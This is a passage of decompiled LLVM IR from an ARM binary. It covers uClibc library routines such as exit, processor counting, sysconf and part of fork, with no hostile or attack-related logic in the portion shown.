  %v2_153d8 = xor i1 %v9_153d0, true
  %v3_153d8 = and i1 %v3_153d0, %v2_153d8
  br i1 %v3_153d8, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_153d8 = urem i32 %v4_153d8, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_153dc = phi i32 [ %v5_153d8, %bb70 ], [ %v4_153d8, %bb69 ]
  %v2_153dc = icmp eq i32 %v0_153dc, 0
  br i1 %v2_153dc, label %bb71, label %dec_label_pc_153e8

bb71:                                             ; preds = %thread-pre-split
  %v4_153e0 = mul i32 %v0_153bc, %v1_153b4
  %v5_153e0 = add i32 %v4_153e0, %v3_153e0
  store i32 %v5_153e0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15388

dec_label_pc_153e8:                               ; preds = %bb67, %thread-pre-split
  %v0_153f0 = call i32 @__aeabi_read_tp()
  %v0_153f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_153f4 = and i32 %v0_152b8, %v0_153f4
  store i32 %v2_153f4, i32* %r7.global-to-local, align 4
  %v0_153f8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_153f8, i32* %ip.global-to-local, align 4
  %v3_153fc = load i16, i16* @global_var_24150.533, align 2
  %v4_153fc = sext i16 %v3_153fc to i32
  %v3_15404 = add i32 %v4_153fc, %v0_153f0
  %v4_15404 = inttoptr i32 %v3_15404 to i32*
  store i32 34, i32* %v4_15404, align 4
  %v0_15388.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15388

dec_label_pc_1540c.loopexit:                      ; preds = %bb66
  %v0_1540c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1540c

dec_label_pc_1540c:                               ; preds = %.thread, %dec_label_pc_1540c.loopexit
  %v1_15410 = phi i32 [ %v1_1541027, %dec_label_pc_1540c.loopexit ], [ %v1_1541029, %.thread ]
  %v2_15410 = phi i32 [ %v0_1540c.pre, %dec_label_pc_1540c.loopexit ], [ %v0_152ac, %.thread ]
  %v2_1540c = icmp eq i32 %v2_15410, 0
  br i1 %v2_1540c, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_1540c
  %v3_15410 = inttoptr i32 %v2_15410 to i32*
  store i32 %v1_15410, i32* %v3_15410, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_1540c, %bb72
  %v0_15418 = load i32, i32* %r7.global-to-local, align 4
  %v2_15418 = icmp eq i32 %v0_15418, 0
  %. = select i1 %v2_15418, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_15424 = icmp eq i32 %v0_152b8, 0
  %v0_15450.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_15424, label %dec_label_pc_15448, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_15450.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_15430, label %dec_label_pc_15448

dec_label_pc_15430:                               ; preds = %bb76
  %v0_15434 = call i32 @__aeabi_read_tp()
  %v3_15438 = load i16, i16* @global_var_24150.533, align 2
  %v4_15438 = sext i16 %v3_15438 to i32
  %v3_15440 = add i32 %v4_15438, %v0_15434
  %v4_15440 = inttoptr i32 %v3_15440 to i32*
  store i32 34, i32* %v4_15440, align 4
  %v0_15444 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15444, i32* %ip.global-to-local, align 4
  %v0_15448.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15448

dec_label_pc_15448:                               ; preds = %bb76, %bb73, %dec_label_pc_15430
  %v0_15450.pre = phi i32 [ %v0_15450.pre.pre, %bb76 ], [ %v0_15444, %dec_label_pc_15430 ], [ %v0_15450.pre.pre, %bb73 ]
  %v0_15448 = phi i32 [ %v0_15418, %bb76 ], [ %v0_15448.pre, %dec_label_pc_15430 ], [ %v0_15418, %bb73 ]
  %v2_15448 = icmp eq i32 %v0_15448, 0
  br i1 %v2_15448, label %dec_label_pc_15448._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_15448
  %v2_1544c = sub i32 0, %v0_15450.pre
  store i32 %v2_1544c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15448._crit_edge

dec_label_pc_15448._crit_edge:                    ; preds = %dec_label_pc_15448, %bb77
  %v0_15450 = phi i32 [ %v2_1544c, %bb77 ], [ %v0_15450.pre, %dec_label_pc_15448 ]
  ret i32 %v0_15450

; uselistorder directives
  uselistorder i32 %v0_15450.pre, { 1, 0 }
  uselistorder i32 %v0_15450.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_153d8, { 1, 0 }
  uselistorder i1 %v3_153d0, { 1, 0 }
  uselistorder i32 %v1_153d0, { 1, 0 }
  uselistorder i32 %v5_153b0, { 1, 0 }
  uselistorder i32 %v1_1539c, { 1, 0 }
  uselistorder i32 %v1_15394, { 2, 0, 1 }
  uselistorder i32 %v0_153c8, { 1, 0, 2 }
  uselistorder i32 %v0_15388, { 1, 0 }
  uselistorder i32 %v3_15338, { 1, 0 }
  uselistorder i32 %v1_1532c, { 1, 0, 2 }
  uselistorder i32 %v0_15320, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_152fc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_152b8, { 1, 0 }
  uselistorder i32 %v0_152b4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_152b0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 10, 3, 11, 8, 9, 5, 12, 6, 13, 7, 14 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15448._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15448, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_1540c, { 1, 0 }
  uselistorder label %dec_label_pc_153e8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1538c, { 1, 0 }
  uselistorder label %dec_label_pc_15388, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15300, { 1, 0 }
  uselistorder label %dec_label_pc_152fc, { 1, 0 }
  uselistorder label %dec_label_pc_152c4, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r5, align 4
  %v4_1547c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 140) to i32*), align 4
  store i32 %v4_1547c, i32* @r4, align 4
  %v2_15484 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_1549c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1549c)
  %v0_154b0 = load i32, i32* @r5, align 4
  %v2_154b0 = add i32 %v0_154b0, 16
  %v3_154b0 = inttoptr i32 %v2_154b0 to i32*
  %v4_154b0 = load i32, i32* %v3_154b0, align 4
  call void @__pseudo_branch(i32 %v4_154b0)
  %v0_154c0 = load i32, i32* @r5, align 4
  %v2_154c0 = add i32 %v0_154c0, 664
  %v3_154c0 = inttoptr i32 %v2_154c0 to i32*
  %v4_154c0 = load i32, i32* %v3_154c0, align 4
  %v2_154c8 = icmp eq i32 %v4_154c0, 0
  br i1 %v2_154c8, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_154d4 = xor i1 %v2_154c8, true
  call void @__pseudo_cond_branch(i1 %v2_154d4, i32 %v4_154c0)
  store i32 %v2_15484, i32* @r0, align 4
  %v0_154e4 = load i32, i32* @r5, align 4
  %v2_154e4 = add i32 %v0_154e4, 44
  %v3_154e4 = inttoptr i32 %v2_154e4 to i32*
  %v4_154e4 = load i32, i32* %v3_154e4, align 4
  call void @__pseudo_branch(i32 %v4_154e4)
  %v0_154f0 = call i32 @__GI___uClibc_fini()
  %v0_154f8 = load i32, i32* @r5, align 4
  %v2_154f8 = add i32 %v0_154f8, -49284
  %v2_15500 = icmp eq i32 %v2_154f8, 0
  br i1 %v2_15500, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_15508 = xor i1 %v2_15500, true
  call void @__pseudo_cond_branch(i1 %v2_15508, i32 %v2_154f8)
  %v0_1550c = load i32, i32* @r6, align 4
  %v1_15510 = call i32 @__GI__exit(i32 %v0_1550c)
  %v0_15514 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15514, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v2_15514 = load i32, i32* @r8, align 4
  %v4_15514 = lshr i32 %v2_15514, %v4_154e4
  %v5_15514 = sub i32 32, %v4_154e4
  %v6_15514 = shl i32 %v2_15514, %v5_15514
  %v7_15514 = or i32 %v6_15514, %v4_15514
  %v9_15514 = and i32 %v7_15514, %v1_15510
  store i32 %v9_15514, i32* @lr, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_1552c = phi i32 [ %v1_15510, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_1552c

; uselistorder directives
  uselistorder i32 %v1_15510, { 1, 0 }
  uselistorder i32 %v4_154e4, { 1, 0, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 -34008), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_15554 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 -34008))
  store i32 %v1_15554, i32* @r6, align 4
  %v2_15558 = icmp eq i32 %v1_15554, 0
  br i1 %v2_15558, label %dec_label_pc_155d8, label %dec_label_pc_15560

dec_label_pc_15560:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_15568 = load i32, i32* @r4, align 4
  %v2_15568 = add i32 %v0_15568, -36120
  store i32 %v2_15568, i32* @r8, align 4
  %v2_1556c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1556c, i32* @r7, align 4
  br label %bb18

dec_label_pc_15574:                               ; preds = %bb18
  %v3_15574 = load i32, i32* %stack_var_-36, align 4
  %v1_15578 = inttoptr i32 %v3_15574 to i32*
  %v2_15578 = load i32, i32* %v1_15578, align 4
  %v1_1557c = inttoptr i32 %v2_15578 to i8*
  %v2_1557c = load i8, i8* %v1_1557c, align 1
  %v7_15580 = icmp eq i8 %v2_1557c, 99
  br i1 %v7_15580, label %dec_label_pc_15588, label %.backedge3

dec_label_pc_15588:                               ; preds = %dec_label_pc_15574
  %v1_15588 = add i32 %v2_15578, 1
  %v2_15588 = inttoptr i32 %v1_15588 to i8*
  %v3_15588 = load i8, i8* %v2_15588, align 1
  %v7_1558c = icmp eq i8 %v3_15588, 112
  br i1 %v7_1558c, label %dec_label_pc_15594, label %.backedge3

dec_label_pc_15594:                               ; preds = %dec_label_pc_15588
  %v1_15594 = add i32 %v2_15578, 2
  %v2_15594 = inttoptr i32 %v1_15594 to i8*
  %v3_15594 = load i8, i8* %v2_15594, align 1
  %v7_15598 = icmp eq i8 %v3_15594, 117
  br i1 %v7_15598, label %dec_label_pc_155a0, label %.backedge3

dec_label_pc_155a0:                               ; preds = %dec_label_pc_15594
  %v1_155a0 = add i32 %v2_15578, 3
  %v2_155a0 = inttoptr i32 %v1_155a0 to i8*
  %v3_155a0 = load i8, i8* %v2_155a0, align 1
  %v4_155a0 = zext i8 %v3_155a0 to i32
  %v0_155a4 = load i32, i32* @r4, align 4
  %v1_155a4 = load i32, i32* @sl, align 4
  %v2_155a4 = add i32 %v1_155a4, %v0_155a4
  %v3_155a4 = inttoptr i32 %v2_155a4 to i32*
  %v4_155a4 = load i32, i32* %v3_155a4, align 4
  %v2_155a8 = mul nuw nsw i32 %v4_155a0, 2
  %v2_155ac = add i32 %v4_155a4, %v2_155a8
  %v3_155ac = inttoptr i32 %v2_155ac to i16*
  %v4_155ac = load i16, i16* %v3_155ac, align 2
  %v1_155b0 = and i16 %v4_155ac, 8
  %v2_155b0 = icmp eq i16 %v1_155b0, 0
  br i1 %v2_155b0, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_155a0
  %v1_155b4 = load i32, i32* @r5, align 4
  %v2_155b4 = add i32 %v1_155b4, 1
  store i32 %v2_155b4, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_155a0, %dec_label_pc_15574, %dec_label_pc_15588, %dec_label_pc_15594
  %v0_155b8.pre = load i32, i32* @r6, align 4
  %v0_155c4.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_15560
  %v0_155c4 = phi i32 [ %v0_155c4.pre, %.backedge3 ], [ %v2_15568, %dec_label_pc_15560 ]
  %v0_155b8 = phi i32 [ %v0_155b8.pre, %.backedge3 ], [ %v1_15554, %dec_label_pc_15560 ]
  %v4_155c8 = inttoptr i32 %v0_155b8 to i32*
  %v5_155c8 = call i32 @__GI_config_read(i32* %v4_155c8, i32 %v2_1556c, i32 258, i32 %v0_155c4)
  %v2_155cc = icmp eq i32 %v5_155c8, 0
  br i1 %v2_155cc, label %dec_label_pc_1563c, label %dec_label_pc_15574

dec_label_pc_155d8:                               ; preds = %entry
  %v0_155dc = load i32, i32* @r4, align 4
  %v2_155dc = add i32 %v0_155dc, -33996
  store i32 %v2_155dc, i32* @r0, align 4
  %v1_155e0 = call i32 @__GI_config_open(i32 %v2_155dc)
  store i32 %v1_155e0, i32* @r6, align 4
  %v2_155e4 = icmp eq i32 %v1_155e0, 0
  br i1 %v2_155e4, label %bb19, label %dec_label_pc_155f0

bb19:                                             ; preds = %dec_label_pc_155d8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1563c

dec_label_pc_155f0:                               ; preds = %dec_label_pc_155d8
  %v0_155f4 = load i32, i32* @r4, align 4
  %v2_155f4 = add i32 %v0_155f4, -33980
  store i32 %v2_155f4, i32* @r8, align 4
  %v2_155fc = add i32 %v0_155f4, -33944
  store i32 %v2_155fc, i32* @r7, align 4
  %v2_15600 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15600, i32* @r4, align 4
  br label %bb21

dec_label_pc_15608:                               ; preds = %bb21
  %v0_15634 = load i32, i32* @r8, align 4
  %v3_15608 = load i32, i32* %stack_var_-36, align 4
  %v1_1560c = inttoptr i32 %v3_15608 to i32*
  %v2_1560c = load i32, i32* %v1_1560c, align 4
  store i32 %v2_1560c, i32* @r1, align 4
  %v2_15610 = inttoptr i32 %v0_15634 to i8*
  %v3_15610 = call i32 @__GI_strcoll(i8* %v2_15610, i32 %v2_1560c)
  %v2_15614 = icmp eq i32 %v3_15610, 0
  br i1 %v2_15614, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_15608
  %v1_15618 = load i32, i32* @r5, align 4
  %v2_15618 = add i32 %v1_15618, 1
  store i32 %v2_15618, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_15608
  %v0_15624.pre = load i32, i32* @r7, align 4
  %v0_15628.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_155f0
  %v0_15628 = phi i32 [ %v0_15628.pre, %.backedge ], [ %v1_155e0, %dec_label_pc_155f0 ]
  %v0_15624 = phi i32 [ %v0_15624.pre, %.backedge ], [ %v2_155fc, %dec_label_pc_155f0 ]
  %v4_1562c = inttoptr i32 %v0_15628 to i32*
  %v5_1562c = call i32 @__GI_config_read(i32* %v4_1562c, i32 %v2_15600, i32 459266, i32 %v0_15624)
  %v2_15630 = icmp eq i32 %v5_1562c, 0
  br i1 %v2_15630, label %dec_label_pc_1563c, label %dec_label_pc_15608

dec_label_pc_1563c:                               ; preds = %bb18, %bb21, %bb19
  %v0_1563c = load i32, i32* @r6, align 4
  %v1_15640 = inttoptr i32 %v0_1563c to i32*
  %v2_15640 = call i32 @__GI_config_close(i32* %v1_15640)
  %v0_15644 = load i32, i32* @r5, align 4
  %v2_15644 = icmp eq i32 %v0_15644, 0
  %.v0_15644 = select i1 %v2_15644, i32 1, i32 %v0_15644
  ret i32 %.v0_15644

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_1563c, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_15a70

bb:                                               ; preds = %entry
  %v7_15694 = mul i32 %arg1, 4
  %v8_15694 = add i32 %v7_15694, ptrtoint (i32* @global_var_1569c.691 to i32)
  call void @__pseudo_branch(i32 %v8_15694)
  br label %dec_label_pc_15a70

dec_label_pc_15a70:                               ; preds = %bb, %entry
  %v0_15a74 = call i32 @__aeabi_read_tp()
  %v3_15a78 = load i16, i16* @global_var_24150.533, align 2
  %v4_15a78 = sext i16 %v3_15a78 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_15a84 = add i32 %v4_15a78, %v0_15a74
  %v4_15a84 = inttoptr i32 %v3_15a84 to i32*
  store i32 22, i32* %v4_15a84, align 4
  %v0_15c68 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_15c68

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_15ca4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_15ca4, i32* @ip, align 4
  store i32 12968, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r8.global-to-local, align 4
  %v4_15d9416 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 12968) to i32*), align 4
  store i32 %v4_15d9416, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d9818 = icmp eq i32 %v4_15d9416, 0
  br i1 %v2_15d9818, label %dec_label_pc_15da0, label %dec_label_pc_15cc4

dec_label_pc_15cc4:                               ; preds = %entry, %dec_label_pc_15d94.backedge
  store i32 -61441, i32* @ip, align 4
  call void @__pseudo_branch(i32 -61536)
  %v0_15cd0 = load i32, i32* %r7.global-to-local, align 4
  %v1_15cd0 = add i32 %v0_15cd0, 20
  %v2_15cd0 = inttoptr i32 %v1_15cd0 to i32*
  %v3_15cd0 = load i32, i32* %v2_15cd0, align 4
  store i32 %v3_15cd0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15cd4 = icmp eq i32 %v3_15cd0, 0
  store i32 %v3_15cd0, i32* %r4.global-to-local, align 4
  %v1_15cdc = add i32 %v3_15cd0, 1
  store i32 %v1_15cdc, i32* %r1.global-to-local, align 4
  br i1 %v2_15cd4, label %dec_label_pc_15d94.backedge, label %dec_label_pc_15ce4

dec_label_pc_15d94.backedge:                      ; preds = %dec_label_pc_15cc4, %dec_label_pc_15d10
  %v0_15d94 = load i32, i32* %r8.global-to-local, align 4
  %v1_15d94 = load i32, i32* %r5.global-to-local, align 4
  %v2_15d94 = add i32 %v1_15d94, %v0_15d94
  %v3_15d94 = inttoptr i32 %v2_15d94 to i32*
  %v4_15d94 = load i32, i32* %v3_15d94, align 4
  store i32 %v4_15d94, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d98 = icmp eq i32 %v4_15d94, 0
  br i1 %v2_15d98, label %dec_label_pc_15da0, label %dec_label_pc_15cc4

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15cc4
  %v0_15ce4 = load i32, i32* %r8.global-to-local, align 4
  %v1_15ce4 = load i32, i32* %r5.global-to-local, align 4
  %v2_15ce4 = add i32 %v1_15ce4, %v0_15ce4
  %v3_15ce4 = inttoptr i32 %v2_15ce4 to i32*
  %v4_15ce4 = load i32, i32* %v3_15ce4, align 4
  %v1_15ce8 = add i32 %v4_15ce4, 20
  store i32 %v1_15ce8, i32* %r2.global-to-local, align 4
  %v1_15cec132 = inttoptr i32 %v1_15ce8 to i32*
  %v2_15cec133 = load i32, i32* %v1_15cec132, align 4
  store i32 %v2_15cec133, i32* %r3.global-to-local, align 4
  %v3_15cf0135 = icmp uge i32 %v2_15cec133, %v3_15cd0
  store i1 %v3_15cf0135, i1* %cpsr_c.global-to-local, align 1
  %v9_15cf0141 = icmp eq i32 %v2_15cec133, %v3_15cd0
  br i1 %v9_15cf0141, label %dec_label_pc_15cf8, label %dec_label_pc_15d10

dec_label_pc_15cf8:                               ; preds = %dec_label_pc_15ce4, %dec_label_pc_15cf8.dec_label_pc_15cec_crit_edge
  %v0_15cf8142 = phi i32 [ %v1_15cf0.pre, %dec_label_pc_15cf8.dec_label_pc_15cec_crit_edge ], [ %v3_15cd0, %dec_label_pc_15ce4 ]
  store i32 %v0_15cf8142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15d08 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15d08, label %dec_label_pc_15d0c, label %dec_label_pc_15cf8.dec_label_pc_15cec_crit_edge

dec_label_pc_15cf8.dec_label_pc_15cec_crit_edge:  ; preds = %dec_label_pc_15cf8
  %v0_15cec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15cf0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15cec = inttoptr i32 %v0_15cec.pre to i32*
  %v2_15cec = load i32, i32* %v1_15cec, align 4
  store i32 %v2_15cec, i32* %r3.global-to-local, align 4
  %v3_15cf0 = icmp uge i32 %v2_15cec, %v1_15cf0.pre
  store i1 %v3_15cf0, i1* %cpsr_c.global-to-local, align 1
  %v9_15cf0 = icmp eq i32 %v2_15cec, %v1_15cf0.pre
  br i1 %v9_15cf0, label %dec_label_pc_15cf8, label %dec_label_pc_15d10

dec_label_pc_15d0c:                               ; preds = %dec_label_pc_15cf8
  %v0_15d0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15d0c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d10

dec_label_pc_15d10:                               ; preds = %dec_label_pc_15ce4, %dec_label_pc_15cf8.dec_label_pc_15cec_crit_edge, %dec_label_pc_15d0c
  %v0_15d10 = phi i32 [ %v0_15d0c, %dec_label_pc_15d0c ], [ %v2_15cec133, %dec_label_pc_15ce4 ], [ %v2_15cec, %dec_label_pc_15cf8.dec_label_pc_15cec_crit_edge ]
  %v1_15d10 = phi i32 [ %v0_15d0c, %dec_label_pc_15d0c ], [ %v3_15cd0, %dec_label_pc_15ce4 ], [ %v1_15cf0.pre, %dec_label_pc_15cf8.dec_label_pc_15cec_crit_edge ]
  %v3_15d10 = icmp uge i32 %v0_15d10, %v1_15d10
  store i1 %v3_15d10, i1* %cpsr_c.global-to-local, align 1
  %v9_15d10 = icmp eq i32 %v0_15d10, %v1_15d10
  br i1 %v9_15d10, label %dec_label_pc_15d18, label %dec_label_pc_15d94.backedge

dec_label_pc_15d18:                               ; preds = %dec_label_pc_15d10
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_15d2c = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_15d1c

dec_label_pc_15d1c:                               ; preds = %dec_label_pc_15d84, %dec_label_pc_15d18
  %v0_15d1c = load i32, i32* %r7.global-to-local, align 4
  %v1_15d1c = add i32 %v0_15d1c, 4
  %v2_15d1c = inttoptr i32 %v1_15d1c to i32*
  %v3_15d1c = load i32, i32* %v2_15d1c, align 4
  store i32 %v3_15d1c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d20 = icmp eq i32 %v3_15d1c, 0
  br i1 %v2_15d20, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_15d1c
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_15d1c, %bb
  %v2_15d28 = xor i1 %v2_15d20, true
  call void @__pseudo_cond_branch(i1 %v2_15d28, i32 %v3_15d1c)
  %v0_15d30 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15d30, i32* %stack_var_-88, align 4
  %v1_15d34 = inttoptr i32 %v0_15d30 to i32*
  %v2_15d34 = load i32, i32* %v1_15d34, align 4
  store i32 %v2_15d34, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d38 = icmp eq i32 %v2_15d34, 0
  store i32 %v2_15d2c, i32* %r5.global-to-local, align 4
  br i1 %v2_15d38, label %dec_label_pc_15da4.loopexit, label %dec_label_pc_15d4c

dec_label_pc_15d4c:                               ; preds = %bb72
  %v1_15d4c = add i32 %v2_15d34, 20
  store i32 %v1_15d4c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15d50

dec_label_pc_15d50:                               ; preds = %dec_label_pc_15d84.dec_label_pc_15d50_crit_edge, %dec_label_pc_15d4c
  %v0_15d54 = phi i32 [ %v0_15d54.pre, %dec_label_pc_15d84.dec_label_pc_15d50_crit_edge ], [ %v1_15d4c, %dec_label_pc_15d4c ]
  %v0_15d50 = phi i32 [ %v0_15d50.pre, %dec_label_pc_15d84.dec_label_pc_15d50_crit_edge ], [ %v2_15d34, %dec_label_pc_15d4c ]
  %v1_15d50 = add i32 %v0_15d50, 20
  %v2_15d50 = inttoptr i32 %v1_15d50 to i32*
  %v3_15d50 = load i32, i32* %v2_15d50, align 4
  store i32 %v0_15d54, i32* %r2.global-to-local, align 4
  store i32 %v3_15d50, i32* %r4.global-to-local, align 4
  %v1_15d5c = add i32 %v3_15d50, 1
  store i32 %v1_15d5c, i32* %r1.global-to-local, align 4
  %v1_15d60119 = inttoptr i32 %v0_15d54 to i32*
  %v2_15d60120 = load i32, i32* %v1_15d60119, align 4
  store i32 %v2_15d60120, i32* %r3.global-to-local, align 4
  %v3_15d64122 = icmp uge i32 %v2_15d60120, %v3_15d50
  store i1 %v3_15d64122, i1* %cpsr_c.global-to-local, align 1
  %v9_15d64128 = icmp eq i32 %v2_15d60120, %v3_15d50
  br i1 %v9_15d64128, label %dec_label_pc_15d6c, label %dec_label_pc_15d84

dec_label_pc_15d6c:                               ; preds = %dec_label_pc_15d50, %dec_label_pc_15d6c.dec_label_pc_15d60_crit_edge
  %v0_15d6c129 = phi i32 [ %v1_15d64.pre, %dec_label_pc_15d6c.dec_label_pc_15d60_crit_edge ], [ %v3_15d50, %dec_label_pc_15d50 ]
  store i32 %v0_15d6c129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15d7c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15d7c, label %dec_label_pc_15d80, label %dec_label_pc_15d6c.dec_label_pc_15d60_crit_edge

dec_label_pc_15d6c.dec_label_pc_15d60_crit_edge:  ; preds = %dec_label_pc_15d6c
  %v0_15d60.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15d64.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15d60 = inttoptr i32 %v0_15d60.pre to i32*
  %v2_15d60 = load i32, i32* %v1_15d60, align 4
  store i32 %v2_15d60, i32* %r3.global-to-local, align 4
  %v3_15d64 = icmp uge i32 %v2_15d60, %v1_15d64.pre
  store i1 %v3_15d64, i1* %cpsr_c.global-to-local, align 1
  %v9_15d64 = icmp eq i32 %v2_15d60, %v1_15d64.pre
  br i1 %v9_15d64, label %dec_label_pc_15d6c, label %dec_label_pc_15d84

dec_label_pc_15d80:                               ; preds = %dec_label_pc_15d6c
  %v0_15d80 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15d80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d84

